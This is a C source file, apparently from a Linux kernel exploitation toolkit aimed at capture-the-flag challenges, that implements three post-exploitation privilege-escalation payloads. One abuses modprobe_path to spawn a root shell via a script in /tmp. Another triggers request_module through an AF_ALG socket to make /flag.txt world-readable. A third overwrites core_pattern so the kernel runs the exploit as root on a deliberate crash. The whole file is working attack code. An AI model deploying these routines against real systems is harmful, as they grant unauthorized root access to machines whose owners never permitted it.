#include "privesc.h"
#include "../util/util.h"
#include <stdlib.h>
#include <sys/socket.h>

void privesc_modprobe(void) {
    system("echo '#!/bin/sh' > /tmp/x; \
            echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/y");
    system("chmod +x /tmp/y");
    system("/tmp/y");
}

// based on:
// https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch
// required since kernel v6.14-rc1
void privesc_modprobe_socket(void) {
    system("echo '#!/bin/sh\nchmod 777 /flag.txt' > /s");
    system("chmod 777 /s");

    // this is enough to trigger request_module. Bind is not needed
    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) {
        info("socket(AF_ALG) failed \n");
    }

    system("cat /flag.txt");
}

void privesc_core_pattern(char *addr) {

    // /proc/sys/kernel/core_pattern controls how the kernel handles
    // core dumps after a crash. If core_pattern starts with a pipe
    // (|), then the kernel executes that program as root and pipes
    // the crashing process’s memory to it.
    //
    // %P expands to PID of crashing process => kernel executes our
    // exploit with root privileges
    strcpy(addr, "|/proc/%P/exe %P");
    // trigger segfault causing creation of a core dump
    *(volatile int *)0 = 0;
}
